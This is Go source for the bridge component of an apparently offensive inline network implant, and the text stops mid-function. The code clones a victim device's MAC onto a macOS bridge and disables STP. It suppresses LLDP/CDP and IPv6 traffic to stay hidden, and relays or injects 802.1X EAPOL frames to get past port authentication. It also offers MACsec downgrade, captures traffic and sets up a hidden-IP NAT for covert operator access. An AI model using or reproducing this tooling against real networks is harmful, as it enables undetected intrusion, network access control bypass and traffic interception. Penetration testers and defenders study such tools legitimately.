package bridge

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/mcrn/goLAN/internal/eapol"
	"github.com/mcrn/goLAN/internal/stealth"
)

// BridgeState represents the current state of the bridge.
type BridgeState int

const (
	BridgeStateDown               BridgeState = iota
	BridgeStateCreated                        // bridge created but not fully up
	BridgeStateUp                             // bridge active and forwarding
	BridgeStateSniffing                       // bridge up, waiting for target identity
	BridgeStatePaused                         // failure occurred, waiting for user to continue
	BridgeStateReady                          // recon complete, bridge UP, awaiting user action
	BridgeStateStealthActive                  // stealth NAT and spoofing applied
	BridgeStateEAPOLDetected                  // 802.1X observed while transparent L2 forwarding continues
	BridgeStateEAPOLRelaying                  // actively relaying EAPOL auth frames
	BridgeStateEAPOLAuthenticated             // EAP-Success received, port is open
	BridgeStateEAPOLFailed                    // EAP-Failure received
	BridgeStateDowngrading                    // MACsec detected, attempting downgrade
	BridgeStateEAPOLListening                 // passively testing for EAPOL
)

func (s BridgeState) String() string {
	switch s {
	case BridgeStateDown:
		return "Down"
	case BridgeStateCreated:
		return "Created"
	case BridgeStateUp:
		return "Active"
	case BridgeStateSniffing:
		return "Sniffing..."
	case BridgeStatePaused:
		return "Paused"
	case BridgeStateReady:
		return "Ready"
	case BridgeStateStealthActive:
		return "Stealth Active"
	case BridgeStateEAPOLDetected:
		return "802.1X Observed"
	case BridgeStateEAPOLRelaying:
		return "802.1X Relaying"
	case BridgeStateEAPOLAuthenticated:
		return "802.1X Authenticated"
	case BridgeStateEAPOLFailed:
		return "802.1X Failed"
	case BridgeStateDowngrading:
		return "MACsec Downgrade"
	case BridgeStateEAPOLListening:
		return "802.1X Listening"
	default:
		return "Unknown"
	}
}

// Bridge represents a macOS kernel bridge between two network interfaces.
type Bridge struct {
	mu             sync.Mutex
	name           string // e.g. "bridge0"
	ifaceA         string // first member interface (Device)
	ifaceB         string // second member interface (Switch)
	state          BridgeState
	origForwarding string // original ip.forwarding value before we changed it
	origIPv6Fwd    string // original ip6.forwarding value before we changed it
	isStealth      bool
	targetID       *stealth.TargetIdentity
	networkMap     *stealth.NetworkMap
	ctx            context.Context
	cancelCtx      context.CancelFunc
	reconLogs      []string
	protectedMACs  []net.HardwareAddr

	// User-controlled toggles
	continueOnFail  bool          // If true, auto-continue past failures (default: false)
	macsecDowngrade bool          // If true, drop MKA frames during manual relay (default: false)
	continueCh      chan struct{} // Unblocks bridge goroutine when user presses Continue

	// NAT proxy state
	natHiddenIP       string // The orthogonal IP assigned to bridge0 for NAT (empty = no NAT)
	natHiddenNetmask  string // Netmask used for the NAT anchor IP.
	natAnchorMode     string // same-subnet or orthogonal fallback.
	natAnchorEvidence string // Why the current NAT anchor was selected.
	natRouteNetwork   string // Target network route installed for NAT mode
	natRouteNetmask   string // Target network netmask installed for NAT mode
	natRouteInstalled bool
	isNATActive       bool // Whether NAT proxy is currently enabled

	// 802.1X EAPOL relay state
	eapolRelay       *eapol.Relay
	eapolSession     *eapol.AuthSession
	eapolPassthrough bool
	cancelEAPOL      context.CancelFunc

	// Listener state
	isListening    bool
	cancelListen   context.CancelFunc
	observerIfaces map[string]bool
	captureIfaces  map[string]bool
	capturePaths   []string
	captureDir     string
}

// BridgeStatus is a snapshot of the bridge state for the TUI.
type BridgeStatus struct {
	Name      string
	IfaceA    string
	IfaceB    string
	State     BridgeState
	TargetID  *stealth.TargetIdentity
	ReconLogs []string

	// 802.1X fields
	EAPOLActive        bool
	EAPOLAuthenticated bool
	EAPOLPassthrough   bool
	EAPMethod          string
	EAPOLFramesRelayed int
	MACsecDetected     bool
	CaptureFiles       []string

	// NAT/operator access fields
	NATActive         bool
	NATHiddenIP       string
	NATHiddenNetmask  string
	NATAnchorMode     string
	NATAnchorEvidence string
	NATRouteNetwork   string
	NATRouteNetmask   string
}

// NewBridge creates a macOS kernel bridge between two interfaces.
// This requires root privileges.
func NewBridge(ifaceA, ifaceB string, ignoreMAC string, captureDir string, localMACStrs ...string) (*Bridge, error) {
	ctx, cancel := context.WithCancel(context.Background())
	b := &Bridge{
		ifaceA:          ifaceA,
		ifaceB:          ifaceB,
		state:           BridgeStateDown,
		macsecDowngrade: false,
		continueCh:      make(chan struct{}, 1),
		ctx:             ctx,
		cancelCtx:       cancel,
		observerIfaces:  make(map[string]bool),
		captureIfaces:   make(map[string]bool),
		captureDir:      captureDir,
	}

	localMACStrs = append(localMACStrs, ignoreMAC, getCurrentMAC(ifaceA), getCurrentMAC(ifaceB))
	b.protectedMACs = parseProtectedMACs(localMACStrs...)

	// Save original IP forwarding state.
	origFwd, err := sysctl("net.inet.ip.forwarding")
	if err == nil {
		b.origForwarding = origFwd
	}
	origIPv6Fwd, err := sysctl("net.inet6.ip6.forwarding")
	if err == nil {
		b.origIPv6Fwd = origIPv6Fwd
	}

	// Step 1: Create the bridge interface.
	out, err := runCmd("ifconfig", "bridge", "create")
	if err != nil {
		return nil, fmt.Errorf("creating bridge: %w (output: %s)", err, out)
	}
	b.name = strings.TrimSpace(out)
	b.state = BridgeStateCreated

	// Step 2: Bring ONLY the Device port up so we can silently sniff it.
	// We deliberately leave the Switch port electrically dead (DOWN) to prevent macOS
	// from leaking factory MAC discovery packets to the active switch!
	_, _ = runCmd("ifconfig", ifaceA, "up")

	// Step 3: Harden the bridge against Layer 2 leaks.
	// NOTE: STP must be disabled AFTER members are added (addm) — macOS bridge(4)
	// only accepts per-member STP config on existing members. This is done in onMacFunc.

	// Disable IPv6 forwarding globally to prevent NDP Router Solicitations
	// and Neighbor Discovery from leaking macOS host identity.
	_, _ = runCmd("sysctl", "-w", "net.inet6.ip6.forwarding=0")

	// We DELAY bridging them until the MAC is explicitly spoofed!

	// Kick off stealth NAT setup if requested.
	// Hardcoded to true for now as per user request to use strat 1.
	b.isStealth = true

	if b.isStealth {
		b.state = BridgeStateSniffing
		go b.runStealth(b.ctx, ignoreMAC)
	}

	return b, nil
}

// runStealth asynchronously sniffs the line and brings the bridge up.
// After MAC spoof and bridge UP, it enters BridgeStateReady and waits
// for the user to choose an action mode via the TUI.
func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
	// ifaceA is the Device Port. We sniff here because packets from the
	// device enter this port before traversing the bridge.
	sniff := stealth.NewSniffer(b.ifaceA)

	logFunc := func(msg string) {
		b.mu.Lock()
		b.reconLogs = append(b.reconLogs, msg)
		b.mu.Unlock()
	}
	b.startPacketCaptures(ctx, logFunc, b.ifaceA)

	onMacFunc := func(mac net.HardwareAddr, firstFrame []byte) {
		b.mu.Lock()
		b.state = BridgeStateUp
		b.ensureTargetIdentityLocked(mac)
		b.mu.Unlock()
		b.startNetworkObservers(ctx, mac, logFunc, b.ifaceA)

		logFunc(fmt.Sprintf("[*] Target MAC locked: %s. Activating transparent bridge immediately.", mac.String()))
		if _, err := runCmd("ifconfig", b.name, "ether", mac.String()); err != nil {
			logFunc(fmt.Sprintf("[W] Bridge MAC spoof failed: %v — bridge will rely on MAC learning", err))
		} else {
			logFunc(fmt.Sprintf("[+] Bridge interface identity set to target MAC %s", mac.String()))
		}

		logFunc(fmt.Sprintf("[*] Setting switch-side adapter identity to target MAC %s", mac.String()))
		out, err := runCmd("ifconfig", b.ifaceB, "ether", mac.String())

		spoofFailed := false
		if err != nil {
			spoofFailed = true
			if strings.Contains(out, "Network is down") {
				logFunc("[W] Switch adapter will not accept hardware MAC while down; not strobing it before bridge filters are installed.")
			} else {
				logFunc(fmt.Sprintf("[W] Switch adapter hardware MAC spoof failed: %v (%s)", err, strings.TrimSpace(out)))
			}
			logFunc("[*] Continuing with transparent bridge forwarding; forwarded frames preserve the PC source MAC.")
		} else {
			logFunc(fmt.Sprintf("[+] Switch-side adapter identity set to target MAC %s", mac.String()))
		}

		logFunc("[*] Bridging device port to switch...")
		if out, err := runCmd("ifconfig", b.name, "addm", b.ifaceA, "addm", b.ifaceB); err != nil {
			logFunc(fmt.Sprintf("[!] Bridge member attach failed: %v (%s)", err, strings.TrimSpace(out)))
			b.mu.Lock()
			b.state = BridgeStatePaused
			b.mu.Unlock()
			return
		}
		b.startPacketCaptures(ctx, logFunc, b.name, b.ifaceB)
		b.startNetworkObservers(ctx, mac, logFunc, b.name, b.ifaceB)

		// Disable STP on BOTH members — macOS bridges send BPDUs by default,
		// which triggers BPDU Guard on enterprise switches and instantly shuts the port.
		// This MUST happen AFTER addm — bridge(4) only accepts per-member config on existing members.
		if out, err := runCmd("ifconfig", b.name, "stp", b.ifaceA, "disabled"); err != nil {
			logFunc(fmt.Sprintf("[W] Failed to disable STP on %s: %v (%s)", b.ifaceA, err, strings.TrimSpace(out)))
		}
		if out, err := runCmd("ifconfig", b.name, "stp", b.ifaceB, "disabled"); err != nil {
			logFunc(fmt.Sprintf("[W] Failed to disable STP on %s: %v (%s)", b.ifaceB, err, strings.TrimSpace(out)))
		}

		// Suppress local host identity and L2 discovery leaks before the switch port goes UP.
		b.installBridgeSafety(mac, logFunc)

		if out, err := runCmd("ifconfig", b.name, "up"); err != nil {
			logFunc(fmt.Sprintf("[!] Bridge bring-up failed: %v (%s)", err, strings.TrimSpace(out)))
			b.mu.Lock()
			b.state = BridgeStatePaused
			b.mu.Unlock()
			return
		}
		b.startPacketCaptures(ctx, logFunc, b.name)
		b.startNetworkObservers(ctx, mac, logFunc, b.name)

		logFunc("[*] Powering UP Switch adapter...")
		if out, err := runCmd("ifconfig", b.ifaceB, "up"); err != nil {
			logFunc(fmt.Sprintf("[!] Switch-side adapter bring-up failed: %v (%s)", err, strings.TrimSpace(out)))
			b.mu.Lock()
			b.state = BridgeStatePaused
			b.mu.Unlock()
			return
		}
		b.startPacketCaptures(ctx, logFunc, b.ifaceB)
		b.startNetworkObservers(ctx, mac, logFunc, b.ifaceB)

		if spoofFailed {
			out, err = runCmd("ifconfig", b.ifaceB, "ether", mac.String())
			if err != nil {
				logFunc(fmt.Sprintf("[W] Switch adapter hardware MAC still locked after bridge-up: %v (%s)", err, strings.TrimSpace(out)))
				logFunc("[W] Staying transparent: the kernel bridge and EAPOL passthrough will forward frames with the PC MAC.")
			} else {
				logFunc(fmt.Sprintf("[+] Switch-side adapter identity set to target MAC %s after bridge-up", mac.String()))
			}
		}

		// Suppress IPv6 autoconf IMMEDIATELY to prevent link-local NDP leaks.
		// Previously this was in setupNATProxy() which was too late.
		if out, err := runCmd("ifconfig", b.name, "inet6", "-autoconf"); err != nil {
			logFunc(fmt.Sprintf("[W] Bridge IPv6 autoconf suppression failed: %v (%s)", err, strings.TrimSpace(out)))
		}

		logFunc("[*] Bridge physical tunnel UP.")
		logFunc("[+] Transparent L2 passthrough active. Non-EAPOL frames flow through the kernel bridge.")
		b.startEAPOLPassthrough(ctx, mac, firstFrame, logFunc)
	}

	id, err := sniff.Discover(ctx, ignoreMAC, logFunc, onMacFunc)
	if err != nil {
		logFunc(fmt.Sprintf("[!] Reconnaissance aborted: %v", err))
		return
	}

	b.mu.Lock()
	b.mergeTargetIdentityLocked(id)
	switch b.state {
	case BridgeStateEAPOLRelaying, BridgeStateEAPOLAuthenticated, BridgeStateEAPOLFailed:
		// Keep the automatic EAPOL passthrough/auth state that was started as soon
		// as the MAC lock completed.
	default:
		if id.EAPOLDetected {
			b.state = BridgeStateEAPOLDetected
		} else {
			b.state = BridgeStateReady
		}
	}
	b.mu.Unlock()

	if id.EAPOLDetected {
		logFunc("[+] Layer 2 recon complete. Transparent forwarding active; 802.1X is being observed passively.")
	} else {
		logFunc("[+] Layer 2 recon complete. Transparent forwarding active. Optional action modes are available.")
	}

	// Continue learning optional Layer 3 and NAC metadata in the background.
	// None of these fields gate transparent Layer 2 forwarding.
	go b.observeIdentityUpdates(ctx, ignoreMAC, logFunc)

	// Start the continuous network observer on the bridge interface.
	// This passively maps all traffic flowing through the bridge — hosts, DNS,
	// VLANs — without generating any packets. Runs until bridge is destroyed.
	b.startNetworkObservers(ctx, id.MAC, logFunc, b.name, b.ifaceA, b.ifaceB)
}

// observeIdentityUpdates continuously enriches the target identity after
// Layer 2 readiness. It intentionally does not block bridging or action modes.
func (b *Bridge) observeIdentityUpdates(ctx context.Context, ignoreMAC string, logFunc func(string)) {
	b.mu.Lock()
	var targetMAC net.HardwareAddr
	if b.targetID != nil && len(b.targetID.MAC) > 0 {
		targetMAC = append(net.HardwareAddr(nil), b.targetID.MAC...)
	}
	b.mu.Unlock()

	if targetMAC == nil {
		return
	}

	sniff := stealth.NewSniffer(b.ifaceA)
	err := sniff.ObserveIdentity(ctx, targetMAC, ignoreMAC, logFunc, func(update stealth.TargetIdentity) {
		var logs []string

		b.mu.Lock()
		if b.targetID == nil {
			b.mu.Unlock()
			return
		}

		if len(update.IP) > 0 && !update.IP.Equal(b.targetID.IP) {
			b.targetID.IP = append(net.IP(nil), update.IP...)
			logs = append(logs, "[+][RECON] Target IPv4 observed: "+b.targetID.IP.String())
		}
		if len(update.Netmask) > 0 && string(update.Netmask) != string(b.targetID.Netmask) {
			b.targetID.Netmask = append(net.IPMask(nil), update.Netmask...)
			b.targetID.NetmaskObserved = update.NetmaskObserved
			logs = append(logs, "[+][RECON] Target netmask observed: "+net.IP(b.targetID.Netmask).String())
		}
		if update.NetmaskObserved && !b.targetID.NetmaskObserved {
			b.targetID.NetmaskObserved = true
		}
		if len(update.Gateway) > 0 && !update.Gateway.Equal(b.targetID.Gateway) {
			b.targetID.Gateway = append(net.IP(nil), update.Gateway...)
			logs = append(logs, "[+][RECON] Gateway candidate observed: "+b.targetID.Gateway.String())
		}
		if update.EAPOLDetected && !b.targetID.EAPOLDetected {
			b.targetID.EAPOLDetected = true
			if b.state == BridgeStateReady {
				b.state = BridgeStateEAPOLDetected
			}
			logs = append(logs, "[+][802.1X] EAPOL observed after Layer 2 readiness.")
		}
		if len(update.AuthenticatorMAC) > 0 && !macEqual(update.AuthenticatorMAC, b.targetID.AuthenticatorMAC) {
			b.targetID.AuthenticatorMAC = append(net.HardwareAddr(nil), update.AuthenticatorMAC...)
			logs = append(logs, "[+][802.1X] Authenticator MAC observed: "+b.targetID.AuthenticatorMAC.String())
		}
		if update.VLANID != 0 && b.targetID.VLANID == 0 {
			b.targetID.VLANID = update.VLANID
			logs = append(logs, fmt.Sprintf("[+][VLAN] Primary VLAN observed: %d", update.VLANID))
		}
		for _, vlan := range update.VLANs {
			if !containsVLAN(b.targetID.VLANs, vlan) {
				b.targetID.VLANs = append(b.targetID.VLANs, vlan)
				if b.targetID.VLANID == 0 {
					b.targetID.VLANID = vlan
				}
				logs = append(logs, fmt.Sprintf("[+][VLAN] VLAN observed: %d", vlan))
			}
		}
		b.mu.Unlock()

		for _, msg := range logs {
			logFunc(msg)
		}
	})
	if err != nil && err != context.Canceled {
		logFunc(fmt.Sprintf("[!][RECON] Identity observer stopped: %v", err))
	}
}

// runNetworkObserver starts the passive network observer on the bridge interface.
// It continuously maps all traffic flowing through the bridge — hosts, DNS queries,
// VLANs — without generating any packets. Runs until context is cancelled.
func (b *Bridge) runNetworkObserver(ctx context.Context, logFunc func(string)) {
	b.mu.Lock()
	observeIfaces := []string{b.name, b.ifaceA, b.ifaceB}
	var targetMAC net.HardwareAddr
	if b.targetID != nil && len(b.targetID.MAC) > 0 {
		targetMAC = make(net.HardwareAddr, len(b.targetID.MAC))
		copy(targetMAC, b.targetID.MAC)
	}
	netMap := stealth.NewNetworkMap()
	if b.targetID != nil {
		b.targetID.NetworkMap = netMap
	}
	b.mu.Unlock()

	if targetMAC == nil {
		logFunc("[!][RECON] Cannot start observer: no target MAC.")
		return
	}

	seen := make(map[string]bool)
	for _, observeIface := range observeIfaces {
		if observeIface == "" || seen[observeIface] {
			continue
		}
		seen[observeIface] = true
		observer := stealth.NewObserver(observeIface)
		go observer.RunInto(ctx, targetMAC, netMap, logFunc)
	}

	<-ctx.Done()
}

func (b *Bridge) startNetworkObservers(ctx context.Context, targetMAC net.HardwareAddr, logFunc func(string), ifaces ...string) {
	if len(targetMAC) == 0 {
		return
	}
	targetCopy := append(net.HardwareAddr(nil), targetMAC...)

	b.mu.Lock()
	netMap := b.ensureNetworkMapLocked()
	if b.targetID == nil {
		b.ensureTargetIdentityLocked(targetCopy)
	}
	if b.targetID != nil {
		b.targetID.NetworkMap = netMap
	}
	var start []string
	for _, iface := range ifaces {
		if iface == "" || b.observerIfaces[iface] {
			continue
		}
		start = append(start, iface)
	}
	b.mu.Unlock()

	for _, iface := range start {
		observeIface := iface
		observer := stealth.NewObserver(observeIface)
		if err := observer.StartInto(ctx, targetCopy, netMap, logFunc); err != nil {
			logFunc(fmt.Sprintf("[W][RECON] Observer unavailable on %s: %v", observeIface, err))
			continue
		}
		b.mu.Lock()
		b.observerIfaces[observeIface] = true
		b.mu.Unlock()
	}
}

func (b *Bridge) startPacketCaptures(ctx context.Context, logFunc func(string), ifaces ...string) {
	var start []string
	b.mu.Lock()
	for _, iface := range ifaces {
		if iface == "" || b.captureIfaces[iface] {
			continue
		}
		start = append(start, iface)
	}
	b.mu.Unlock()

	for _, iface := range start {
		path, err := stealth.StartPacketCapture(ctx, iface, stealth.CaptureOptions{Dir: b.captureDir}, logFunc)
		if err != nil {
			logFunc(fmt.Sprintf("[W][PCAP] Capture unavailable on %s: %v", iface, err))
			continue
		}
		b.mu.Lock()
		b.captureIfaces[iface] = true
		b.capturePaths = append(b.capturePaths, path)
		b.mu.Unlock()
		logFunc(fmt.Sprintf("[+][PCAP] Passive capture active on %s: %s", iface, path))
	}
}

func (b *Bridge) ensureNetworkMapLocked() *stealth.NetworkMap {
	if b.networkMap == nil {
		b.networkMap = stealth.NewNetworkMap()
	}
	return b.networkMap
}

func (b *Bridge) ensureTargetIdentityLocked(mac net.HardwareAddr) {
	if b.targetID == nil {
		b.targetID = &stealth.TargetIdentity{}
	}
	if len(b.targetID.MAC) == 0 && len(mac) > 0 {
		b.targetID.MAC = append(net.HardwareAddr(nil), mac...)
	}
	b.targetID.NetworkMap = b.ensureNetworkMapLocked()
}

func (b *Bridge) mergeTargetIdentityLocked(id *stealth.TargetIdentity) {
	if id == nil {
		return
	}
	if b.targetID == nil {
		clone := cloneTargetIdentity(id)
		b.targetID = clone
	} else {
		if len(id.MAC) > 0 {
			b.targetID.MAC = append(net.HardwareAddr(nil), id.MAC...)
		}
		if len(id.IP) > 0 {
			b.targetID.IP = append(net.IP(nil), id.IP...)
		}
		if len(id.Netmask) > 0 {
			b.targetID.Netmask = append(net.IPMask(nil), id.Netmask...)
			b.targetID.NetmaskObserved = id.NetmaskObserved
		}
		if len(id.Gateway) > 0 {
			b.targetID.Gateway = append(net.IP(nil), id.Gateway...)
		}
		if id.EAPOLDetected {
			b.targetID.EAPOLDetected = true
		}
		if len(id.AuthenticatorMAC) > 0 {
			b.targetID.AuthenticatorMAC = append(net.HardwareAddr(nil), id.AuthenticatorMAC...)
		}
		if id.VLANID != 0 {
			b.targetID.VLANID = id.VLANID
		}
		for _, vlan := range id.VLANs {
			if !containsVLAN(b.targetID.VLANs, vlan) {
				b.targetID.VLANs = append(b.targetID.VLANs, vlan)
			}
		}
	}
	b.targetID.NetworkMap = b.ensureNetworkMapLocked()
}

func (b *Bridge) installBridgeSafety(targetMAC net.HardwareAddr, logFunc func(string)) {
	protected := b.protectedSourceMACs(targetMAC)
	if err := stealth.InstallL2SafetyRules(b.name, protected); err != nil {
		logFunc(fmt.Sprintf("[W] L2 source-MAC safety rules degraded: %v", err))
	} else if len(protected) > 0 {
		logFunc("[+] L2 source-MAC safety rules installed for local adapter identities.")
	}
	if err := stealth.SuppressL2Leaks(b.name); err != nil {
		logFunc(fmt.Sprintf("[W] L2 discovery leak suppression degraded: %v", err))
	} else {
		logFunc("[+] STP/LLDP/CDP leak suppression verified.")
	}
}

func (b *Bridge) protectedSourceMACs(targetMAC net.HardwareAddr) []net.HardwareAddr {
	b.mu.Lock()
	defer b.mu.Unlock()
	protected := make([]net.HardwareAddr, 0, len(b.protectedMACs))
	for _, mac := range b.protectedMACs {
		if len(mac) != 6 || (len(targetMAC) == 6 && macEqual(mac, targetMAC)) {
			continue
		}
		protected = append(protected, append(net.HardwareAddr(nil), mac...))
	}
	return protected
}

// Continue unblocks the bridge goroutine when it's paused on a failure.
func (b *Bridge) Continue() {
	select {
	case b.continueCh <- struct{}{}:
	default:
	}
}

// SetContinueOnFail sets whether the bridge auto-continues past failures.
func (b *Bridge) SetContinueOnFail(enabled bool) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.continueOnFail = enabled
}

// ContinueOnFail returns the current continue-on-fail setting.
func (b *Bridge) ContinueOnFail() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.continueOnFail
}

// SetMACsecDowngrade sets whether MKA frames are dropped during EAPOL relay.
func (b *Bridge) SetMACsecDowngrade(enabled bool) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.macsecDowngrade = enabled
}

// MACsecDowngrade returns the current MACsec downgrade setting.
func (b *Bridge) MACsecDowngrade() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.macsecDowngrade
}

// IsNATActive returns whether NAT proxy is currently enabled on the bridge.
func (b *Bridge) IsNATActive() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.isNATActive
}

// DisableNATProxy removes the NAT proxy, restoring the bridge to L2-only passthrough.
// This flushes pfctl rules and removes the hidden IP from bridge0. The target device's
// traffic continues flowing through the bridge unaffected — only the operator's
// MacBook loses network access.
func (b *Bridge) DisableNATProxy(logFunc func(string)) error {
	b.mu.Lock()
	hiddenIP := b.natHiddenIP
	bridgeName := b.name
	wasActive := b.isNATActive
	b.mu.Unlock()

	if !wasActive {
		logFunc("[*] NAT proxy is not active — nothing to disable.")
		return nil
	}

	logFunc("[*] Disabling NAT proxy...")

	// 1. Flush pfctl rules.
	if err := stealth.DisableNAT(); err != nil {
		logFunc(fmt.Sprintf("[!] Failed to flush pfctl rules: %v", err))
		return err
	}
	logFunc("[+] pfctl rules flushed.")

	// 2. Remove the hidden IP from the bridge interface.
	if hiddenIP != "" {
		if _, err := runCmd("ifconfig", bridgeName, "delete", hiddenIP); err != nil {
			logFunc(fmt.Sprintf("[!] Failed to remove hidden IP %s: %v", hiddenIP, err))
			// Non-fatal — continue anyway.
		} else {
			logFunc(fmt.Sprintf("[+] Removed hidden IP %s from %s.", hiddenIP, bridgeName))
		}
	}
	b.removeNATRoute(logFunc)
	b.restoreIPv4Forwarding(logFunc)

	b.mu.Lock()
	b.isNATActive = false
	b.natHiddenIP = ""
	b.natHiddenNetmask = ""
	b.natAnchorMode = ""
	b.natAnchorEvidence = ""
	b.natRouteNetwork = ""
	b.natRouteNetmask = ""
	b.natRouteInstalled = false
	b.mu.Unlock()

	logFunc("[+] NAT proxy disabled. Bridge is in L2-only passthrough mode.")
	logFunc("[*] Operator has no network access. Target device is unaffected.")
	logFunc("[*] Press [N] to re-enable NAT proxy, or [A] for full auto mode.")

	return nil
}

// EAPOLDetected returns whether the sniffer detected 802.1X during recon.
func (b *Bridge) EAPOLDetected() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.targetID == nil {
		return false
	}
	return b.targetID.EAPOLDetected
}

// GatewayKnown returns whether the gateway IP has been discovered.
// NAT proxy requires the gateway to be known.
func (b *Bridge) GatewayKnown() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.targetID == nil {
		return false
	}
	return b.targetID.HasGateway()
}

// startEAPOLPassthrough starts the always-on 802.1X forwarding pump used by the
// invisible bridge path. The kernel bridge carries normal frames; this userspace
// pump carries EAPOL because 802.1X uses link-local control destinations that
// OS bridges may consume or refuse to forward.
func (b *Bridge) startEAPOLPassthrough(ctx context.Context, supplicantMAC net.HardwareAddr, firstFrame []byte, logFunc func(string)) {
	if len(supplicantMAC) == 0 {
		return
	}

	b.mu.Lock()
	if b.eapolRelay != nil {
		b.mu.Unlock()
		return
	}

	session := eapol.NewAuthSession(append(net.HardwareAddr(nil), supplicantMAC...))
	if b.targetID != nil {
		session.VLANID = b.targetID.VLANID
		if len(b.targetID.AuthenticatorMAC) > 0 {
			session.AuthenticatorMAC = append(net.HardwareAddr(nil), b.targetID.AuthenticatorMAC...)
		}
	}

	relay := eapol.NewRelay(b.ifaceA, b.ifaceB, session, logFunc)
	relay.SetModeName("EAPOL passthrough")
	relay.SetSuppressLogoff(false)
	relay.SetInjectStart(false)
	relay.SetStrictAuthenticator(false)
	relay.SetStrictVLAN(false)
	if len(firstFrame) > 0 {
		relay.SetInitialFrame(firstFrame)
	}

	eapolCtx, eapolCancel := context.WithCancel(ctx)
	b.eapolSession = session
	b.eapolRelay = relay
	b.eapolPassthrough = true
	b.cancelEAPOL = eapolCancel
	b.state = BridgeStateEAPOLRelaying
	b.mu.Unlock()

	if err := stealth.SuppressNativeEAPOL(b.name, b.ifaceA, b.ifaceB); err != nil {
		logFunc(fmt.Sprintf("[W][802.1X] Could not suppress native bridge EAPOL forwarding: %v", err))
		logFunc("[W][802.1X] Passthrough will still forward EAPOL, but duplicates may occur if macOS also forwards it.")
	} else {
		logFunc("[+][802.1X] EAPOL passthrough owns 802.1X link-local frames; normal traffic remains kernel-bridged.")
	}

	go func() {
		if err := relay.Start(eapolCtx); err != nil && eapolCtx.Err() == nil {
			logFunc(fmt.Sprintf("[!][802.1X] EAPOL passthrough stopped: %v", err))
			b.mu.Lock()
			if b.eapolRelay == relay {
				b.eapolRelay = nil
				b.eapolSession = nil
				b.eapolPassthrough = false
				b.cancelEAPOL = nil
				b.state = BridgeStateEAPOLFailed
			}
			b.mu.Unlock()
			if resetErr := stealth.ResetBridgeRules(b.name); resetErr != nil {
				logFunc(fmt.Sprintf("[W][802.1X] Failed to reset bridge rules after passthrough error: %v", resetErr))
			}
			b.installBridgeSafety(supplicantMAC, logFunc)
		}
	}()

	go b.watchEAPOLAuth(eapolCtx, relay, logFunc)
}

func (b *Bridge) watchEAPOLAuth(ctx context.Context, relay *eapol.Relay, logFunc func(string)) {
	for {
		authResult, err := relay.WaitForAuth(ctx)
		if err != nil {
			return
		}
		if authResult == nil {
			continue
		}

		b.mu.Lock()
		if b.eapolRelay != relay {
			b.mu.Unlock()
			return
		}
		if authResult.Success {
			b.state = BridgeStateEAPOLAuthenticated
		} else {
			b.state = BridgeStateEAPOLFailed
		}
		b.mu.Unlock()

		if authResult.Success {
			logFunc(fmt.Sprintf("[+][802.1X] Port authorized while transparently forwarding via %s", authResult.Method))
		} else {
			logFunc("[!][802.1X] Authentication failed while transparently forwarding.")
		}
	}
}

// RunListenEAPOL starts passive 802.1X detection — observe only, no relay.
func (b *Bridge) RunListenEAPOL(logFunc func(string)) {
	b.mu.Lock()
	if b.isListening {
		if b.cancelListen != nil {
			b.cancelListen()
		}
		b.isListening = false
		b.state = BridgeStateReady
		b.mu.Unlock()
		logFunc("[*][802.1X] Passive EAPOL listener stopped.")
		return
	}

	b.isListening = true
	b.state = BridgeStateEAPOLListening
	ctx, cancel := context.WithCancel(b.ctx)
	b.cancelListen = cancel
	b.mu.Unlock()

	logFunc("[*][802.1X] Passive EAPOL listener started. Observing continuously — no relay.")

	detector := eapol.NewDetector(b.ifaceB)
	// Listen indefinitely until cancelled.
	_, err := detector.Detect(ctx, 24*time.Hour, logFunc, true)
	if err != nil && err != context.Canceled {
		logFunc(fmt.Sprintf("[!][802.1X] Listener stopped: %v", err))
		return
	}

	// If it returns, we handle the state.
	b.mu.Lock()
	if b.isListening {
		b.isListening = false
		b.state = BridgeStateReady
	}
	b.mu.Unlock()
}

// RunEAPOLRelay starts the active EAPOL relay (requires 802.1X detected).
func (b *Bridge) RunEAPOLRelay(logFunc func(string)) {
	b.mu.Lock()
	ctx := b.ctx
	b.mu.Unlock()

	b.runEAPOLRelay(ctx, logFunc)
}

// RunNATProxy sets up the stealth NAT proxy (skips 802.1X).
func (b *Bridge) RunNATProxy(logFunc func(string)) {
	b.mu.Lock()
	var id *stealth.TargetIdentity
	if b.targetID != nil {
		id = cloneTargetIdentity(b.targetID)
	}
	b.mu.Unlock()

	if id == nil {
		logFunc("[!] Cannot setup NAT: no target identity.")
		return
	}

	b.setupNATProxy(id, logFunc)
}

// RunInjectEAPOL sends an EAPOL-Start frame on the switch port to prompt
// the authenticator into sending EAP-Request/Identity. This is useful when
// the device needs to initiate 802.1X authentication from its side.
func (b *Bridge) RunInjectEAPOL(logFunc func(string)) {
	b.mu.Lock()
	var supplicantMAC net.HardwareAddr
	var vlanID uint16
	if b.targetID != nil {
		supplicantMAC = make(net.HardwareAddr, len(b.targetID.MAC))
		copy(supplicantMAC, b.targetID.MAC) // Deep copy MAC to prevent data race
		vlanID = b.targetID.VLANID
	}
	alreadyListening := b.isListening
	b.mu.Unlock()

	if supplicantMAC == nil {
		logFunc("[!][802.1X] Cannot inject EAPOL: no target identity.")
		return
	}

	logFunc("[*][802.1X] Injecting EAPOL-Start on switch port to trigger authenticator...")
	if err := eapol.InjectEAPOLStartWithVLAN(b.ifaceB, supplicantMAC, vlanID, logFunc); err != nil {
		logFunc(fmt.Sprintf("[!][802.1X] EAPOL-Start injection failed: %v", err))
	} else {
		logFunc("[+][802.1X] EAPOL-Start injected. Listening for switch response...")
		// After injection, start passive listening only if not already listening.
		if !alreadyListening {
			go b.RunListenEAPOL(logFunc)
		}
	}
}

// runEAPOLRelay manages the 802.1X EAPOL relay lifecycle.
func (b *Bridge) runEAPOLRelay(ctx context.Context, logFunc func(string)) {
	b.mu.Lock()
	if b.targetID == nil {
		b.mu.Unlock()
		logFunc("[!][802.1X] Cannot start relay: no target identity.")
		return
	}
	if b.eapolRelay != nil {
		b.mu.Unlock()
		logFunc("[*][802.1X] EAPOL forwarding is already active.")
		return
	}
	session := eapol.NewAuthSession(b.targetID.MAC)
